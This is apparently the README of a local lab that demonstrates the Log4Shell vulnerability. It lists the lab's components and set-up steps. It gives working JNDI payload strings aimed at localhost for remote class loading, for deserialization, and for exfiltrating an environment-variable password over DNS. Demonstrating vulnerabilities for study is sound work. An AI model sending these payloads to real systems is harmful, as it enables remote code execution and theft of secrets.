# Overview

The components are:

- `log4shell`: Logs a logline using `log4j`.
- `ldap`: A simple LDAP server.
- `remote`: The code of the exploit that is used during the remote class loading.
- `serialization`: Creates a serialized object of the exploit.
  - To use this e.g. `commons-collections:commons-collections:3.1` has to be on the classpath.
- `serve_exploit.sh`: Compiles the `remote`-project and starts a server that serves the class-file.
- `listen_to_udp.sh`: Opens a UDP port and responds.
- `jndi`: Example the the exploit that only uses JNDI.

In `build.gradle` of `log4shell` the value `Dcom.sun.jndi.ldap.object.trustURLCodebase=true` is set, so that
the part using remote classloading works. It certainly also is intertesting to try these examples without this parameter.

#  Preparation

- `gradle ldap:run`, to start the LDAP server.
- `./serve_exploit.sh`, to compiole the exploit and start the server that serves the code.
- `./listen_to_udp.py`, to accept data on UDP port 1053.

# Testing the Exploits

Call

```
gradle log4shell:run --args="<logstring>" 
```

with the following values for `logstring`:

- `\${jndi:ldap://127.0.0.1:1389/dc=javaNamingReference}` for the remote code exploit.
- `\${jndi:ldap://127.0.0.1:1389/dc=javaSerializedData}` for the exploit that uses classes in the classpath.
- `\${jndi:dns://127.0.0.1:1053/\${env:MY_PASSWORD}}` to transfer data via DNS. For this `MY_PASSWORD` should
  be set accordingly in advance.
